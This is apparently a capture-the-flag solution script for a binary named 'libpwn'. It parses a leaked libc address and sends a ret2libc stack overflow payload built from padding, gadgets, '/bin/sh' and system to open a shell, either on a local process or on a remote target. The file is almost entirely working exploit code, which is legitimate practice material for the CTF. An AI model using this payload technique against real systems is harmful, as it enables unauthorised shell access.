#!/usr/bin/python3
from pwncus import *
from time import sleep

context.log_level = 'debug'
exe = context.binary = ELF('./libpwn_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)

def GDB(): gdb.attach(p, gdbscript='''

b*main+152
c
''') if not args.REMOTE else None

if args.REMOTE:
    con = sys.argv[1:]
    p = remote(con[0], int(con[1]))
else:
    p = process(argv=[exe.path], aslr=False)
set_p(p)
if args.GDB: GDB(); input()

# ===========================================================
#                          EXPLOIT
# ===========================================================

'''
[*] '/home/alter/CTFs/VSL/Present/libpwn'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
'''

def exploit():

    ru(b'But wait, I have a present for you!\n')
    libc.address = hexleak(rl()) - libc.sym.fgets
    slog('Libc base',libc.address)

    pl = cyclic(0x38) + p64(0x0000000000401016) + p64(0x000000000010f75b + libc.address) + p64(next(libc.search(b'/bin/sh'))) + p64(libc.sym.system)
    sla(b'present:', pl)

    interactive()

if __name__ == '__main__':
    exploit()
